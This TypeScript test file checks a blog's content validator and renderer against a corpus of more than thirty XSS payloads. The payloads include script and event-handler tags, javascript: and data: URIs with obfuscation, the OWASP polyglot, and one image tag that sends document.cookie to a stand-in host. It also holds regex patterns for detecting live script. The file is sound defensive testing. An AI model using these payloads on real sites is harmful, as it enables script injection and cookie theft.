import { describe, expect, it } from 'vitest';

import { renderPostContent } from '@/lib/content/render';
import type { ContentJson } from '@/lib/content/schema';
import { validatePostContent } from '@/lib/content/validate';
import { ValidationError } from '@/lib/errors';

/**
 * The ≥30-payload XSS regression corpus required by BLOG-19's acceptance
 * criteria. Two categories, run against both enforcement points
 * (src/lib/content/validate.ts, the write path; src/lib/content/render.ts,
 * the render path — exercised here as if the payload were a legacy row
 * that bypassed write-time validation, the worst case):
 *
 * - `structural` payloads are shaped as a disallowed node/mark/attribute/
 *   scheme — the write path MUST throw a ValidationError for every one
 *   (nothing structurally wrong is ever silently accepted), and the
 *   render path (simulating a row that predates a schema tightening)
 *   must still produce HTML with no live script execution.
 * - `text` payloads are dangerous-looking strings inside an otherwise
 *   valid text node — the write path must NOT reject them (there is
 *   nothing structurally wrong with a text node; "a post about XSS
 *   payloads" is legitimate content for this blog's tech niche) and the
 *   render path must emit them as inert, escaped text, never as a live
 *   tag/attribute.
 *
 * A payload "escapes" if the rendered HTML contains a live `<script>`,
 * `<iframe>`, `<svg>`, `<style>` tag, a live `on*` handler attribute on a
 * real element, or a `javascript:`/`vbscript:`/`data:` scheme inside a
 * live `href`/`src` attribute. `assertNoLiveScriptExecution` checks all
 * of that in one place so every payload is held to the same bar.
 */

const ALLOWED_IMAGE_ORIGIN = 'https://media.example.test';
const OPTS = { allowedImageOrigin: ALLOWED_IMAGE_ORIGIN };

function assertNoLiveScriptExecution(html: string) {
  expect(html).not.toMatch(/<script[\s>]/i);
  expect(html).not.toMatch(/<iframe[\s>]/i);
  expect(html).not.toMatch(/<svg[\s>]/i);
  expect(html).not.toMatch(/<style[\s>]/i);
  // A real tag carrying a live on* handler attribute (not merely the
  // substring "onerror=" appearing inside already-escaped text).
  expect(html).not.toMatch(/<[a-zA-Z][a-zA-Z0-9-]*\b[^>]*\son\w+\s*=/i);
  // A live javascript:/vbscript:/data: scheme inside a real (unescaped) tag's
  // href/src attribute — requiring the `<tagname ... >` wrapper is what
  // distinguishes this from the same substring appearing safely inside
  // HTML-escaped text (e.g. "&lt;a href=\"javascript:...\"&gt;").
  expect(html).not.toMatch(
    /<[a-zA-Z][a-zA-Z0-9-]*\b[^>]*\s(?:href|src)\s*=\s*["']?\s*(?:javascript|vbscript|data):[^>]*>/i,
  );
}

function textDoc(text: string): ContentJson {
  return { type: 'doc', content: [{ type: 'paragraph', content: [{ type: 'text', text }] }] };
}

function linkDoc(href: string): ContentJson {
  return {
    type: 'doc',
    content: [
      {
        type: 'paragraph',
        content: [{ type: 'text', text: 'link', marks: [{ type: 'link', attrs: { href } }] }],
      },
    ],
  };
}

function imageDoc(src: string): ContentJson {
  return { type: 'doc', content: [{ type: 'image', attrs: { src } }] };
}

interface StructuralCase {
  name: string;
  doc: ContentJson;
}

interface TextCase {
  name: string;
  payload: string;
}

// --- Category: text content (text node, hard to break since text is always HTML-escaped on serialize) ---
const TEXT_PAYLOADS: TextCase[] = [
  { name: 'script tag as literal text', payload: '<script>alert(1)</script>' },
  { name: 'case-varied script tag', payload: '<ScRiPt>alert(1)</sCrIpT>' },
  { name: 'nested/malformed tag confusion', payload: '<<script>script>alert(1)</script>' },
  { name: 'img onerror as literal text', payload: '<img src=x onerror=alert(1)>' },
  { name: 'svg onload as literal text', payload: '<svg onload=alert(1)></svg>' },
  {
    name: 'svg with embedded script as literal text',
    payload: '<svg><script>alert(1)</script></svg>',
  },
  {
    name: 'style tag with javascript url as literal text',
    payload: "<style>body{background:url('javascript:alert(1)')}</style>",
  },
  {
    name: 'iframe javascript src as literal text',
    payload: '<iframe src="javascript:alert(1)"></iframe>',
  },
  { name: 'body onload as literal text', payload: '<body onload=alert(1)>' },
  { name: 'autofocus onfocus as literal text', payload: '<input onfocus=alert(1) autofocus>' },
  { name: 'marquee onstart as literal text', payload: '<marquee onstart=alert(1)>' },
  {
    name: 'anchor with javascript href as literal text (not a real link mark)',
    payload: '<a href="javascript:alert(1)">click</a>',
  },
  {
    name: 'base64 SVG data URI as literal text',
    payload: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">',
  },
  {
    name: 'classic OWASP polyglot',
    payload:
      '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
  },
  {
    name: 'detect/exfil img tag as literal text',
    payload: '<img src="https://evil.example/steal?c=document.cookie">',
  },
  {
    name: 'meta refresh as literal text',
    payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  },
];

// --- Category: structural attacks (disallowed node/mark/attribute/scheme) ---
const STRUCTURAL_CASES: StructuralCase[] = [
  {
    name: 'disallowed node type (scriptBlock)',
    doc: {
      type: 'doc',
      content: [{ type: 'scriptBlock', content: [{ type: 'text', text: 'alert(1)' }] }],
    },
  },
  {
    name: 'iframe-shaped node',
    doc: { type: 'doc', content: [{ type: 'iframe', attrs: { src: 'https://evil.example' } }] },
  },
  {
    name: 'html-passthrough-shaped node',
    doc: {
      type: 'doc',
      content: [{ type: 'rawHtml', attrs: { html: '<script>alert(1)</script>' } }],
    },
  },
  { name: 'unknown mark type (underline)', doc: textNodeWithMark({ type: 'underline' }) },
  {
    name: 'unknown mark type masquerading as script',
    doc: textNodeWithMark({ type: 'script', attrs: { src: 'https://evil.example/x.js' } }),
  },
  {
    name: 'unknown attribute key on paragraph (onclick)',
    doc: {
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          attrs: { onclick: 'alert(1)' },
          content: [{ type: 'text', text: 'x' }],
        },
      ],
    },
  },
  {
    name: 'unknown attribute key on link mark (onclick)',
    doc: {
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          content: [
            {
              type: 'text',
              text: 'x',
              marks: [
                {
                  type: 'link',
                  attrs: { href: 'https://ok.example', onclick: 'alert(1)' } as never,
                },
              ],
            },
          ],
        },
      ],
    },
  },
  { name: 'link href javascript:', doc: linkDoc('javascript:alert(1)') },
  { name: 'link href JAVASCRIPT: (case-variant)', doc: linkDoc('JAVASCRIPT:alert(1)') },
  { name: 'link href with tab obfuscation', doc: linkDoc('java\tscript:alert(1)') },
  { name: 'link href with newline obfuscation', doc: linkDoc('java\nscript:alert(1)') },
  {
    name: 'link href data: with embedded script',
    doc: linkDoc('data:text/html,<script>alert(1)</script>'),
  },
  { name: 'link href vbscript:', doc: linkDoc('vbscript:msgbox(1)') },
  { name: 'link href protocol-relative', doc: linkDoc('//evil.example/x') },
  { name: 'link href empty', doc: linkDoc('') },
  { name: 'link href whitespace-padded javascript:', doc: linkDoc('  javascript:alert(1)') },
  { name: 'image src javascript:', doc: imageDoc('javascript:alert(1)') },
  { name: 'image src data: URI', doc: imageDoc('data:image/png;base64,AAAA') },
  { name: 'image src off-origin https', doc: imageDoc('https://evil.example/x.png') },
  { name: 'image src relative path (no scheme)', doc: imageDoc('/etc/passwd') },
  { name: 'image src protocol-relative', doc: imageDoc('//evil.example/x.png') },
  {
    name: 'heading level out of range (1)',
    doc: {
      type: 'doc',
      content: [{ type: 'heading', attrs: { level: 1 }, content: [{ type: 'text', text: 't' }] }],
    },
  },
  {
    name: 'malformed marks (not an array)',
    doc: {
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          content: [{ type: 'text', text: 'x', marks: 'not-an-array' as never }],
        },
      ],
    },
  },
];

function textNodeWithMark(mark: { type: string; attrs?: Record<string, unknown> }): ContentJson {
  return {
    type: 'doc',
    content: [{ type: 'paragraph', content: [{ type: 'text', text: 'x', marks: [mark] }] }],
  };
}

describe(`XSS corpus — text payloads (${TEXT_PAYLOADS.length} entries) must survive as inert escaped text`, () => {
  it.each(TEXT_PAYLOADS)('$name', async ({ payload }) => {
    const doc = textDoc(payload);

    // Plain text content is structurally valid — nothing to reject on write.
    expect(() => validatePostContent(doc, OPTS)).not.toThrow();

    const html = await renderPostContent(doc, OPTS);
    assertNoLiveScriptExecution(html);
  });
});

describe(`XSS corpus — structural payloads (${STRUCTURAL_CASES.length} entries) must be rejected on write and never execute on render`, () => {
  it.each(STRUCTURAL_CASES)('$name', async ({ doc }) => {
    expect(() => validatePostContent(doc, OPTS)).toThrow(ValidationError);

    // Simulates a row that bypassed write-time validation (predates a
    // schema tightening, or was written outside the normal API path) —
    // the render path is the backstop and must not execute anything.
    const html = await renderPostContent(doc, OPTS);
    assertNoLiveScriptExecution(html);
  });
});

describe('XSS corpus — legitimate rich constructs survive sanitisation unchanged', () => {
  it('a real link, image, code block, and nested list all render', async () => {
    const doc: ContentJson = {
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          content: [
            {
              type: 'text',
              text: 'a link',
              marks: [{ type: 'link', attrs: { href: 'https://example.com' } }],
            },
          ],
        },
        { type: 'image', attrs: { src: `${ALLOWED_IMAGE_ORIGIN}/photo.webp`, alt: 'a photo' } },
        {
          type: 'codeBlock',
          attrs: { language: 'python' },
          content: [{ type: 'text', text: "print('hi')" }],
        },
        {
          type: 'orderedList',
          content: [
            {
              type: 'listItem',
              content: [{ type: 'paragraph', content: [{ type: 'text', text: 'first' }] }],
            },
          ],
        },
      ],
    };
    expect(() => validatePostContent(doc, OPTS)).not.toThrow();
    const html = await renderPostContent(doc, OPTS);
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain(`src="${ALLOWED_IMAGE_ORIGIN}/photo.webp"`);
    expect(html).toContain('print');
    expect(html).toContain('<ol>');
    expect(html).toContain('first');
  });
});
